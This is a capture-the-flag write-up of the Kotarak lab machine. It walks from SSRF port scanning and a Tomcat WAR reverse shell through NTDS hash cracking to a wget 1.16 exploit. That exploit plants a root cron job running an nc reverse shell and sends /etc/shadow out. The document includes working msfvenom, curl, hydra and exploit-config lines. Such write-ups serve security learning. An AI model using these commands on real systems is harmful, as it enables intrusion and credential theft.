## Summary
- **Kotarak** is a really fun box. it had **SSH**, an **Apache web server** and **Tomcat** listening on the outside.
- *Even though the Tomcat was vulnerable to* [Ghostcat](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938), that path didn't take us anywhere.
- *Instead,* the **web page** on the **Apache** had a **Server-Side Request Forgery** which we could exploit to get further.
- We used the **SSRF** and `wfuzz` to **enumerate the open internal ports** and found a **web page which had a backup** of the `tomcat-users.xml` file.
- That file **contained credentials** that we used to **upload a WAR reverse shell** and get on the box.
- *On the file system,* we found an **Active Directory** `ntds.dit` **dump** which was apparently a remnant of a pentest.
- We **extracted all the domain hashes** from that and cracked one of them for a password which belonged to the `atanas` local user.
- *As* `atanas`, we came to **find a file owned by us** called `app.log` ***within the root folder.***
- It contained past events of **another host using a vulnerable version** of `wget` to fetch data from ours.
- *After finding a tool called* `authbind` *installed on the system* (*it lets you use low ports without being root*) we use it to **deploy a python web server** and verify that ***there were indeed requests still being made to our machine.***
- We set up **an elaborate exploit** to target the client's `wget` enabling us to **plant a cron job** to **run as root** and **give us a shell on his box.**

```

The **full range port scan** gets us that **Apache on port 60000** as well as the **two Tomcat ports** 8009 and 8080 plus **SSH**.

The `http-title` nmap script gives us a hint that there's **custom content** there (**Kotarak Web Hosting**)

## Quickly Testing Tomcat
We will go over some **fast checks** here first looking for **easy wins**.

*when visiting port 8080,* we found **an error message** there **instead of the standard home page.**

![](/assets/Kotarak/tomcat-home-page-error.jpg)

We first want to **test for default credentials** in the **Tomcat manager interface**. So we check for it in **the standard location** at `/manager/html`

![](/assets/Kotarak/tomcat-manager-login.jpg)

It's there. that **pop-up** indicates **HTTP basic authentication**. we can use `hydra` to **brute-force** that.

we're going to use **Metasploit's default user/password list:**

![](/assets/Kotarak/getting-the-msf-list.jpg)

but we need to **change up the list** to match the format that `hydra`'s `-C` flag will accept: `login:pass`

![](/assets/Kotarak/the-list-and-hydra-usage.jpg)

a quick `sed` **replacing all spaces with colons** (`:`) takes care of that and we **save the list to a file** before launcing the attack

```bash
hydra -C tomcat_user_pass_list.txt -s 8080 -f kotarak http-get /manager/html -vV
```

![](/assets/Kotarak/hydra-attack.jpg)

no luck though :/

*Next,* we **check for exploits** using `searchsploit` (our version is 8.5.5)

![](/assets/Kotarak/searchsploit-tomcat-8.jpg)

The only match was "Apache Tomcat 6/7/8/9 Information Disclosure" [CVE-2016-6816](https://nvd.nist.gov/vuln/detail/CVE-2016-6816). but it didn't seem of good use to us.

*however,* we ought to check if the famous **Ghostcat vulnerability** [CVE-2020-1938](https://nvd.nist.gov/vuln/detail/CVE-2020-1938) was there.

![](/assets/Kotarak/ghostcat-nvd.jpg)

**our version should be vulnerable.** Let's use this [Github exploit](https://github.com/00theway/Ghostcat-CNVD-2020-10487) for testing:

![](/assets/Kotarak/ajpshooter-usage.jpg)

the usage seems pretty straighforward.

*from* `nmap`*'s output,* the `ajp_port` port is `8009`

```bash
python ajpShooter.py http://kotarak:8080 8009 /WEB-INF/web.xml read
```

![](/assets/Kotarak/ajpshooter-works.jpg)

We were **able to read** the `/WEB-INF/web.xml` file but **there wasn't anything useful in it**. So we move on..

## The Apache High Port
*On port 60000,* we find this page:

![](/assets/Kotarak/port-60k.jpg)

none of the links on the left side work. But our senses are telling us that we **should check for SSRF here.**

That's because the page talks **about browsing**. *And, in the source code,* the form's **action for submission** is the `url.php` file.

we have to **test a URL here as input.**

![](/assets/Kotarak/possible-ssrf-detection.jpg)

we'll first test if it can connect back to us.

So we stand up a **quick PHP web server** with `php -S 0.0.0.0:80` and supply the URL for our kali:

**Note:** a normal python web server or netcat would still be OK. *I just felt like using PHP at the time XD*

![](/assets/Kotarak/ssrf-confirmed.jpg)

we got a request back!

## Exploiting SSRF
We're going to use `wfuzz` to see **what's listening on the box locally.**

we first do a **quick fuzz** over ports 8080 to 8090 to **see the reponses for open ports (like 8080) vs. closed ports (8081-8090)** and be able to **tune out the closed ones.**

***a.k.a calibrate our toolz :D***

![](/assets/Kotarak/wfuzz-test-run.jpg)

*alright, from the response size,* we **detect port 8080** which **we knew was up serving the tomcat**

we can deduce that **there's nothing listening on the other ports** from the small responses (2 characters).

we will use the `--hh` flag to **exclude those responses** and **provide the full range of TCP ports** (1-65535) for fuzzing.

Setting the `-t` flag to **50 concurrent connections** is good ***for speed*** since **we're going to do 65K+ requests** and *we haven't got all day :D*

```bash
wfuzz -t 50 --hh 2 -z range,1-65535 -c http://kotarak:60000/url.php?path=http://127.0.0.1:FUZZ
```

![](/assets/Kotarak/ssrf-portscan-results.jpg)

a **lot of ports** come up:
- 22 (SSH)
- 90
- 110
- 200
- 320
- 888
- 3306 (mysql most likely)
- 8080 (tomcat)
- and 60000 (the browser page)

*checking the unknown ports...*

**Port 90:** junk

![](/assets/Kotarak/ssrf-port-90.jpg)

**Port 110:** junk too

![](/assets/Kotarak/ssrf-port-110.jpg)

**Port 200:** third is a charm right? nope. junk also :P

![](/assets/Kotarak/ssrf-port-200.jpg)

**Port 320:** a login form! but, the ***action field within the form is empty.*** junk for the 4th time :/

![](/assets/Kotarak/ssrf-port-320.jpg)

**Port 888:** at last something interesting here xD

![](/assets/Kotarak/ssrf-port-888.jpg)

*to get the file,* we add `?doc=backup` to the base url and use `curl` *instead of clicking the link.*

![](/assets/Kotarak/cred-found-on-888.jpg)

it turns out to be the `tomcat-users.xml` file. **we got creds!**

## WAR Shell Upload
*Before getting too excited,* we first **verify the logins** with `hydra`

![](/assets/Kotarak/hydra-verify-tomcat.jpg)

Green! we're good to go

***To get remote code exectuion,*** we will need to **generate a WAR reverse shell** with `msfvenom`

```bash
msfvenom -p java/shell_reverse_tcp lhost=10.10.16.5 lport=9000 -f war -o letmein.war
```

and **upload it** with `curl`
```bash
curl -v -u admin:'3@g01PdhB!' --upload-file letmein.war "http://kotarak:8080/manager/text/deploy?path=/shell&update=true"
```

then do another `curl` to **hit the endpoint** and **trigger our shell**
```bash
curl http://kotarak:8080/shell
```

It should look like this:

![](/assets/Kotarak/shell-as-tomcat.jpg)

**We're in. Sweet :]**

## Lateral Movement
*after getting our reverse shell,* we **improve it** like the usual:

![](/assets/Kotarak/shell-improvement.jpg)

and we `source` the `.bashrc` file from the `atanas` user for a colored output.

![](/assets/Kotarak/getting-colors-in-our-session.jpg)

*when going through the file system,* we find **something very interesting:**

![](/assets/Kotarak/finding-ntds-dump.jpg)

the **keywords** here are:
- the **1st file's name:** **NTDS** (this is the name of the **Active Directory database file** `ntds.dit`)
- the **2nd file's type:** **MS Windows Registry** file (*probably the* ***system hive*** *containing the* ***boot key*** *needed to* ***extract hashes***)

**these two components are enough for us to get all the domain hashes within.**

[Impacket](https://github.com/SecureAuthCorp/impacket)'s `secretsdump.py` script can easily take care of this.

we're first going to **transfer those files over** to kali to **dump those hashes and try to crack them**

![](/assets/Kotarak/transfer-ad-dump.jpg)

*after renaming the .dit file to* `ntds.dit` *and the .bin file to* `system`, we run:

```bash
secretsdump.py -just-dc-ntlm -ntds ntds.dit -system system local
```

![](/assets/Kotarak/secrets-dump.jpg)

We then pass those to `hashcat`

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

![](/assets/Kotarak/hashcat-cracking.jpg)

the hash that cracked belonged to the `administrator` user.

![](/assets/Kotarak/knowing-which-hash-was-cracked.jpg)

*Just to be sure,* we're going to try it with both `root` and `atanas`. since we didn't find other users locally with a proper shell.

![](/assets/Kotarak/finding-local-linux-users.jpg)

it failed with `root` but worked with `atanas`

![](/assets/Kotarak/shell-as-atanas.jpg)

## Unusual Activity
*Starting on privesc,* we ran [LinPEAS](https://github.com/carlospolop/PEASS-ng) and **saw something very strange:**

![](/assets/Kotarak/root-files.jpg)

we own files in `/root`?

*to confirm,* we run a `find` command and checked the files owned by us:
- `flag.txt`
- `app.log`

![](/assets/Kotarak/activity-detected.jpg)

*Looking above,* you can see a few things in the `app.log` file:
1. there's **another machine's IP:** 10.0.3.133
2. *looking at the dates, back in 2017 (when the box first came out),* it executed `wget` 3 times *-each 2 minutes apart-* to **get a file** called `archive.tar.gz` which it couldn't get (it got a 404 not found)
3. it was **using an older version** of `wget` (1.16)

we make **a couple of checks** to see what's going on:
- **searching the file system** for that `archive.tar.gz` and checking if we can see its contents.
- **pinging 10.0.3.133** to see if it's there.

![](/assets/Kotarak/understanding-app-log.jpg)

we couldn't find `archive.tar.gz`. But, **the host 10.0.3.133 was there and responding to our pings!**

we look up **exploit-db** for that version of `wget` before moving on

![](/assets/Kotarak/wget-searchsploit.jpg)

there was actually an exploit for `wget`!

## Elaborate Client-Side Exploitation and Privilege Escalation
**Client-Side attacks** aren't new. *But for some odd reason,* **exploiting a command-line tool** felt weird :D

*Anyway,* we **check out exploit's details** on [Exploit-db](https://www.exploit-db.com/exploits/40064)

It was a very interesting read. *To sum it up,* the scenario is:
- if a victim is using `wget` 1.16 to download a file **from a server that we control.**
- *and* `wget` *was used* ***without an output being specified*** *(using the* `-O` *flag)*, it would **save in the current working directory**. which could potentially be ***the user's home folder.***
- *to exploit a situation like that,* we have to **set up a web server** that **will respond with a redirect to an FTP server serving a malicious** `.wgetrc` file.
- that file would then be **saved to the victim's home folder** becoming `wget`'s main configuration. since `wget` would search for it there first.
- It would **specify that upcoming downloads** should have `/etc/cron.d/wget-root-shell` as their output location.
- that configuration would also have the client issue **POST** requests containing his `/etc/shadow`.
- *If everything works, on the second request to our server,* the victim's `/etc/shadow` would be there in the request body.
- And it would **save our then-hosted reverse shell as a cron job** called `wget-root-shell` in their `/etc/cron.d` folder.
- *Having registered a* `cron` *job for that user,* we would **get a reverse shell** in the upcoming minute.

**hopefully this would make more sense in demonstration below :D**

*Alright, to perform this exploit,* we need to be able to **serve a website on the machine on port 80** and **verify we're still getting requests** from a **vulnerable** `wget` **web client.**

*But,* access to ports below 1000 is only available for `root`.

the only way around this is installing a tool called `authbind` (*which also requires* `root` *permission*).

let's first check to see that tool was there or not.

![](/assets/Kotarak/authbind-installed.jpg)

it's there! we're now **more confident** of **being on the right track**

*with it,* we set up a `python` web server on port 80 and **wait to detect any incoming web requests.**

![](/assets/Kotarak/getting-an-http-request.jpg)

We also check the python `pyftpdlib` module **which we will need as our FTP server.**

*And, if that wasn't there,* we should be able to set it up on our kali and still be good.

![](/assets/Kotarak/python-ftp-is-there.jpg)

Great. let's go!

### Step #1: Creating the evil .wgetrc file

we set this up following the instructions on Exploit-DB

![](/assets/Kotarak/exploit-db-wget-instructions.jpg)

![](/assets/Kotarak/wgetrc-created.jpg)

*Starting next step, since we're going to do many things at the same time,* we will use `tmux` to **split up our terminal.**

*However, since we already use* `tmux` *on our kali,* we're going **to change the bind key** to **be able to interact with both** `tmux` **instances.**

here's what the `~/.tmux.conf` file should look like:

```
set-option -g prefix C-a
set -g default-terminal "xterm-256color"
```

the second line is **for preserving colors** within `tmux` sessions. *Quality of life stuff xD*

### Step #2: Getting the python exploit and modifying it

*After fetching the exploit,* we have to **modify a few lines** to suit our needs.

Below is the **default exploit code:**

```python
HTTP_LISTEN_IP = '192.168.57.1'
HTTP_LISTEN_PORT = 80
FTP_HOST = '192.168.57.1'
FTP_PORT = 21

ROOT_CRON = "* * * * * root /usr/bin/id > /root/hacked-via-wget \n"
```

- We're going to **listen on all interfaces with the web server**. so we should set the `HTTP_LISTEN_IP` variable to `0.0.0.0`.
- The same **wouldn't work for the FTP server**. because the victim **must have our machine's IP in the redirection** to reach it.
- *Finally,* we need to switch up the `/usr/bin/id > /root/hacked-via-wget` cron job command to something more serious ***a.k.a. a reverse shell :D***

*After modification,* it should look like this:

```python
HTTP_LISTEN_IP = '0.0.0.0'
HTTP_LISTEN_PORT = 80
FTP_HOST = '10.10.10.55'
FTP_PORT = 21

ROOT_CRON = "* * * * * root rm /tmp/pipe; mkfifo /tmp/pipe; /bin/sh -i < /tmp/pipe 2>&1 | nc 10.10.10.55 9000 > /tmp/pipe; rm /tmp/pipe \n"
```

we use the `mkfifo` reverse shell because **it works across many linux distros** and **has just been reliable :]**

and **we're making the 10.10.10.55 machine catch the shell** because **we're not yet sure about our kali being reachable from 10.0.3.133.**

### Step #3: Receiving the first wget

*A few moments after starting the FTP server and the* `python` *exploit,* we caught something.

![](/assets/Kotarak/wget-exploit-and-ftp-together.jpg)

*if you look closely,* you would see **the incoming request** for `/archive.tar.gz` and **the redirect being sent to FTP** for the `.wgetrc` file.

### Step #4: Getting the shadow file and deploying the evil cron

*Two more minutes after,* we **get the POST request** containing the `/etc/shadow` file.

That's enough proof that our victim is the `root` user. *or at least one who can read the shadow file*

The exploit now **served the** `cron` **containing our reverse shell** and **it was downloaded by the victim** to their `/etc/cron.d` directory.

![](/assets/Kotarak/receiving-the-shadow-file-and-deploying-cron.jpg)

### Step #5: Receiving the Shell

*One minute after,* the `cron` job started and **sent us back our root shell :D**

![](/assets/Kotarak/rooted.jpg)

**Just amazing :D**
